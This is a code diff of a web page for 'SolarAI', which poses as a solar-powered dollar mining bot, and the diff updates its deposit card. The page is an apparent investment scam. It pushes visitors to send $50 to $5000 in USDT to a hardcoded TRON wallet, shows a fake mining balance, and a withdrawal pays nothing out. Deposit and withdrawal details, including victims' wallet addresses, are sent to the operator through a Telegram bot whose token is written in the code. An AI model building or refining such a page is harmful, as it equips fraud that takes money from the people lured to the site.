@@ -23,11 +23,12 @@ body{background:#0a0a0a;color:white;min-height:100vh;}
 .stat b{display:block;font-size:18px;margin-bottom:5px;}
 .stat small{color:#888;font-size:12px;}
 .badge{display:inline-block;background:#00ff8820;color:#00ff88;padding:6px 12px;border-radius:20px;font-size:12px;margin-bottom:20px;border:1px solid #00ff8840;}
-.walletBox{background:#000;border:1px dashed #00ff88;padding:12px;border-radius:10px;word-break:break-all;font-size:13px;color:#00ff88;margin:10px 0;}
+.walletBox{background:#000;border:1px dashed #00ff88;padding:12px;border-radius:10px;word-break:break-all;font-size:13px;color:#00ff88;margin:10px 0;text-align:center;}
 .depositBtns{display:flex;gap:8px;margin-top:15px;}
 .depositBtns button{flex:1;padding:12px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:10px;font-weight:bold;cursor:pointer;}
-.depositBtns button:hover{border-color:#00ff88;color:#00ff88;}
+.depositBtns button:hover,.depositBtns button.active{border-color:#00ff88;color:#00ff88;background:#00ff8815;}
 .network{font-size:11px;color:#ffaa00;background:#ffaa0015;padding:4px 8px;border-radius:6px;display:inline-block;margin-top:5px;}
+.qrBox{background:white;padding:12px;border-radius:12px;display:flex;justify-content:center;margin:15px auto;width:180px;height:180px;}
 </style>
 </head>
 <body>
@@ -41,20 +42,26 @@ body{background:#0a0a0a;color:white;min-height:100vh;}
 <p>Your solar-powered dollar mining bot is live</p>
 </div>
 
-<!-- NEW DEPOSIT CARD -->
 <div class="card" style="border-color:#00ff8840;">
 <div class="balance">💰 Deposit - USDT (TRC20) Only</div>
 <div style="font-size:13px;color:#888;margin-top:5px;">Minimum Deposit: $50</div>
-<div class="walletBox" id="walletDisplay">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
-<div class="network">⚠️ Network: TRON TRC20 Only - Do NOT send BEP20/ERC20</div>
-<div class="depositBtns">
-<button onclick="selectDeposit(50)">$50<br><small>STARTER</small></button>
-<button onclick="selectDeposit(500)">$500<br><small>PRO</small></button>
-<button onclick="selectDeposit(5000)">$5000<br><small>VIP</small></button>
+
+<div class="qrBox">
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" alt="QR Code" style="width:150px;height:150px;">
 </div>
+
+<div class="walletBox" id="walletDisplay">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
+<center><div class="network">⚠️ Network: TRON TRC20 Only</div></center>
+
+<div class="depositBtns">
+<button onclick="selectDeposit(50)" id="btn50">$50<br><small>STARTER</small></button>
+<button onclick="selectDeposit(500)" id="btn500">$500<br><small>PRO</small></button>
+<button onclick="selectDeposit(5000)" id="btn5000">$5000<br><small>VIP</small></button>
+</div>
+
 <button class="btn btn-green" onclick="copyWallet()">📋 COPY WALLET ADDRESS</button>
 <button class="btn btn-outline" onclick="confirmDeposit()">✅ I HAVE SENT USDT (TRC20)</button>
-<div style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Deposit to: TATeM...PrFra via TRC20 | Auto-credited after 1 confirmation</div>
+<div style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Scan QR or Copy Address: TATeM...PrFra | TRC20 | Auto-credited after 1 conf</div>
 </div>
 
 <div class="card">
@@ -79,14 +86,14 @@ let bal=0; let mining=false;
 function selectDeposit(amt){
   if(amt < MIN_DEPOSIT){ alert("❌ Minimum deposit is $50"); return; }
   selectedAmount = amt;
+  document.querySelectorAll('.depositBtns button').forEach(b=>b.classList.remove('active'));
+  document.getElementById('btn'+amt).classList.add('active');
   alert(`✅ Selected: $${amt} USDT (TRC20)\n\nSend to:\n${DEPOSIT_WALLET}\n\nNetwork: TRON TRC20 Only`);
 }
-
 function copyWallet(){
   navigator.clipboard.writeText(DEPOSIT_WALLET);
-  alert("✅ Copied!\n\n" + DEPOSIT_WALLET + "\nUSDT (TRC20) - TRON");
+  alert("✅ Copied!\n\n" + DEPOSIT_WALLET + "\nUSDT (TRC20) - TRON\n\nNow paste in your Trust Wallet / Binance");
 }
-
 function confirmDeposit(){
   let tx = prompt(`💰 Confirm Deposit $${selectedAmount} USDT (TRC20)\n\nWallet: ${DEPOSIT_WALLET}\n\nEnter Transaction Hash (optional) or click OK:`);
   let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
@@ -95,7 +102,6 @@ function confirmDeposit(){
   fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
   alert(`✅ Deposit Request Submitted!\n\nAmount: $${selectedAmount} USDT (TRC20)\nTo: ${DEPOSIT_WALLET}\n\nStatus: Waiting for confirmation\nWill be credited in 10 mins after 1 network confirmation.`);
 }
-
 function mine(){
  if(mining) return;
  mining=true;
@@ -104,20 +110,4 @@ function mine(){
 }
 function withdraw(){
   if(bal < MIN_WITHDRAW){
-    alert(`⚠️ Minimum withdrawal is $${MIN_WITHDRAW}.00\n\nYou have: $${bal.toFixed(2)}\n\nKeep mining until you reach $${MIN_WITHDRAW}!`);
-  } else {
-    let wallet = prompt(`💵 Withdraw $${bal.toFixed(2)}\n\nEnter your USDT (TRC20) wallet address:`);
-    if(wallet && wallet.length > 10){
-      let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
-      let chatId = "1884572429";
-      let text = `🚨 NEW WITHDRAWAL - SolarAI USA\n\n💰 Amount: $${bal.toFixed(2)}\n👛 Wallet: ${wallet}\n💳 Type: USDT (TRC20)\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Site: solarai-capital-usa.vercel.app`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-      alert(`✅ Withdrawal Request Received!\n\nAmount: $${bal.toFixed(2)}\nWallet: ${wallet}\nNetwork: USDT (TRC20)\n\nStatus: PENDING\nWill be processed in 24h by USA team.`);
-      bal=0;
-      document.getElementById('balance').innerText='$0.00';
-    }
-  }
-}
-</script>
-</body>
-</html>
+    alert(`⚠️ Minimum withdrawal is $${MIN_WITHDRAW}.00\n\nYou have: $${bal.toFixed(2)}\n\nKeep mining until you reach $${MIN_WITHDRAW}!
